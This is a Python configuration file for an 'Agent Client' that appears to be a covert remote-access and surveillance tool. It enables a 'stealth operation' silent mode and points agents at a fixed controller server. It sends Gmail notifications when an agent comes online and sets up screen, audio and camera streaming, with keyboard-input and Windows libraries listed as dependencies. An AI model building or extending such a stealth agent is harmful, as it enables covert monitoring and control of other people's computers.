"""
Configuration module for the Agent Client - ENHANCED
Contains all configuration constants, dependencies, and system requirements
Enhanced with secure configuration management and input validation
"""

import os
import hashlib
import logging
import io
import sys
import threading
from typing import Dict, Any, Optional
from dataclasses import dataclass, field
from enum import Enum

# Configuration flags
SILENT_MODE = True  # Enable stealth operation (no console output)
DEBUG_MODE = True  # Enable debug logging for troubleshooting
DEPLOYMENT_COMPLETED = False  # Track deployment status to prevent repeated attempts
RUN_MODE = 'agent'  # Track run mode: 'agent' | 'controller' | 'both'

# Controller URL override flag (set URL via env)
USE_FIXED_SERVER_URL = True
FIXED_SERVER_URL = os.environ.get('FIXED_SERVER_URL', 'https://agent-controller-backend.onrender.com')
SERVER_URL = FIXED_SERVER_URL if USE_FIXED_SERVER_URL else os.environ.get('CONTROLLER_URL', '')

# Email notification configuration (use Gmail App Password)
EMAIL_NOTIFICATIONS_ENABLED = os.environ.get('ENABLE_EMAIL_NOTIFICATIONS', '1') == '1'

# Expected SHA-256 digests (defaults provided; can be overridden via env)
EXPECTED_SHA256 = {
    'GMAIL_USERNAME': os.environ.get('GMAIL_USERNAME_SHA256', '9bf243453c355b42fb43ffe4f00f3209546ce85d5cb65aefede18cf728b37c02'),
    'GMAIL_APP_PASSWORD': os.environ.get('GMAIL_APP_PASSWORD_SHA256', '67944508ba70ca1c01ce9aad2feeee49e9381fa01acc3111bdf38b4b5c413da9'),
    'EMAIL_RECIPIENT': os.environ.get('EMAIL_RECIPIENT_SHA256', '9dcd23d7c1418cc163dd845a3dac654d7541f80d727eadf8d0ee54b2d2d2babb'),
    'FIXED_SERVER_URL': os.environ.get('FIXED_SERVER_URL_SHA256', 'b0e7cb987065e41f72b0be499a0e59aab016c2a9de47a7eaa18a85d9c08b4c63')
}

# Secrets only come from environment, not hard-coded
GMAIL_USERNAME = os.environ.get('GMAIL_USERNAME', '')
GMAIL_APP_PASSWORD = os.environ.get('GMAIL_APP_PASSWORD', '')  # Use App Password, not regular password
EMAIL_RECIPIENT = os.environ.get('EMAIL_RECIPIENT', '')
EMAIL_SENT_ONLINE = False

# Streaming configuration
TARGET_FPS = 15
CAPTURE_QUEUE_SIZE = 5
ENCODE_QUEUE_SIZE = 5
AUDIO_CAPTURE_QUEUE_SIZE = 10
AUDIO_ENCODE_QUEUE_SIZE = 10
TARGET_AUDIO_FPS = 44.1
TARGET_CAMERA_FPS = 30
CAMERA_CAPTURE_QUEUE_SIZE = 5
CAMERA_ENCODE_QUEUE_SIZE = 5

# Audio configuration
CHUNK = 1024
CHANNELS = 1
RATE = 44100

# WebRTC configuration
WEBRTC_ICE_SERVERS = [
    {"urls": ["stun:stun.l.google.com:19302"]},
    {"urls": ["stun:stun1.l.google.com:19302"]}
]

WEBRTC_CONFIG = {
    'ice_servers': [
        {'urls': 'stun:stun.l.google.com:19302'},
        {'urls': 'stun:stun1.l.google.com:19302'},
        {'urls': 'stun:stun2.l.google.com:19302'},
        {'urls': 'stun:stun3.l.google.com:19302'},
        {'urls': 'stun:stun4.l.google.com:19302'}
    ],
    'codecs': {
        'video': ['VP8', 'VP9', 'H.264'],
        'audio': ['Opus', 'PCM']
    },
    'simulcast': True,
    'svc': True,
    'bandwidth_estimation': True,
    'adaptive_bitrate': True,
    'frame_dropping': True,
    'quality_levels': {
        'low': {'width': 640, 'height': 480, 'fps': 15, 'bitrate': 500000},
        'medium': {'width': 1280, 'height': 720, 'fps': 30, 'bitrate': 2000000},
        'high': {'width': 1920, 'height': 1080, 'fps': 30, 'bitrate': 5000000},
        'auto': {'adaptive': True, 'min_bitrate': 500000, 'max_bitrate': 10000000}
    }
}

# Production scale configuration
PRODUCTION_SCALE = {
    'current_implementation': 'aiortc_agent',
    'target_implementation': 'mediasoup',
    'migration_phase': 'planning',
    'scalability_limits': {
        'aiortc_max_viewers': 50,
        'mediasoup_max_viewers': 1000,
        'concurrent_agents': 100,
        'bandwidth_per_agent': 10000000
    },
    'performance_targets': {
        'target_latency': 100,
        'target_bitrate': 5000000,
        'target_fps': 30,
        'max_packet_loss': 0.01
    }
}

def _sha256_hex(value: str) -> str:
    try:
        return hashlib.sha256(value.encode('utf-8')).hexdigest()
    except Exception:
        return ''

# Enhanced configuration classes for better organization
class AgentStatus(Enum):
    """Agent status enumeration"""
    DISCONNECTED = "disconnected"
    CONNECTING = "connecting" 
    CONNECTED = "connected"
    AUTHENTICATED = "authenticated"
    ERROR = "error"

@dataclass
class SecurityConfig:
    """Enhanced security configuration"""
    debug_mode: bool = field(default_factory=lambda: os.environ.get('DEBUG_MODE', 'True').lower() == 'true')
    silent_mode: bool = field(default_factory=lambda: os.environ.get('SILENT_MODE', 'True').lower() == 'true')
    deployment_completed: bool = False
    run_mode: str = field(default_factory=lambda: os.environ.get('RUN_MODE', 'agent'))
    
    # Server configuration
    use_fixed_server_url: bool = True
    fixed_server_url: str = field(default_factory=lambda: os.environ.get('FIXED_SERVER_URL', 'https://agent-controller-backend.onrender.com'))
    
    # Security features
    enable_input_validation: bool = True
    enable_encryption: bool = True
    enable_security_logging: bool = True
    max_retry_attempts: int = 3
    timeout_seconds: int = 30

@dataclass
class StreamingConfig:
    """Enhanced streaming configuration"""
    target_fps: int = 15
    capture_queue_size: int = 5
    encode_queue_size: int = 5
    audio_capture_queue_size: int = 10
    audio_encode_queue_size: int = 10
    target_audio_fps: float = 44.1
    target_camera_fps: int = 30
    camera_capture_queue_size: int = 5
    camera_encode_queue_size: int = 5

class ConfigManager:
    """Enhanced configuration manager with thread safety"""
    
    def __init__(self):
        self._lock = threading.RLock()
        self.security = SecurityConfig()
        self.streaming = StreamingConfig()
        self._feature_availability = {}
        self._check_feature_availability()
    
    def _check_feature_availability(self) -> None:
        """Check which features are available"""
        try:
            # Import availability flags from dependencies
            from dependencies import (
                MSS_AVAILABLE, CV2_AVAILABLE, NUMPY_AVAILABLE, PIL_AVAILABLE,
                SOCKETIO_AVAILABLE, WINDOWS_AVAILABLE, PYNPUT_AVAILABLE,
                REQUESTS_AVAILABLE, PSUTIL_AVAILABLE, PYAUDIO_AVAILABLE
            )
            
            self._feature_availability = {
                'mss': MSS_AVAILABLE,
                'cv2': CV2_AVAILABLE,
                'numpy': NUMPY_AVAILABLE,
                'pil': PIL_AVAILABLE,
                'socketio': SOCKETIO_AVAILABLE,
                'windows': WINDOWS_AVAILABLE,
                'pynput': PYNPUT_AVAILABLE,
                'requests': REQUESTS_AVAILABLE,
                'psutil': PSUTIL_AVAILABLE,
                'pyaudio': PYAUDIO_AVAILABLE,
            }
        except ImportError:
            # Fallback if dependencies module not available
            self._feature_availability = {}
    
    def is_feature_available(self, feature: str) -> bool:
        """Check if a feature is available"""
        with self._lock:
            return self._feature_availability.get(feature, False)
    
    def get_available_features(self) -> list:
        """Get list of available features"""
        with self._lock:
            return [k for k, v in self._feature_availability.items() if v]
    
    def get_server_url(self) -> str:
        """Get the configured server URL"""
        with self._lock:
            if self.security.use_fixed_server_url:
                return self.security.fixed_server_url
            return os.environ.get('CONTROLLER_URL', '')
    
    def update_deployment_status(self, completed: bool) -> None:
        """Update deployment completion status"""
        with self._lock:
            self.security.deployment_completed = completed

# Global configuration instance
config_manager = ConfigManager()

def validate_secret_hashes():
    """Enhanced secret hash validation with better error handling."""
    try:
        validations = {
            'GMAIL_USERNAME': _sha256_hex(GMAIL_USERNAME),
            'GMAIL_APP_PASSWORD': _sha256_hex(GMAIL_APP_PASSWORD),
            'EMAIL_RECIPIENT': _sha256_hex(EMAIL_RECIPIENT),
            'FIXED_SERVER_URL': _sha256_hex(FIXED_SERVER_URL)
        }
        
        all_valid = True
        for key, digest in validations.items():
            expected = EXPECTED_SHA256.get(key, '')
            if expected and digest != expected:
                print(f"[SECURITY WARNING] SHA256 mismatch for {key}")
                all_valid = False
        
        if all_valid:
            print("[SECURITY] All secret hashes validated successfully")
        
        return all_valid
        
    except Exception as e:
        print(f"[SECURITY ERROR] Secret hash validation failed: {e}")
        return False

def get_config() -> ConfigManager:
    """Get the global configuration manager"""
    return config_manager
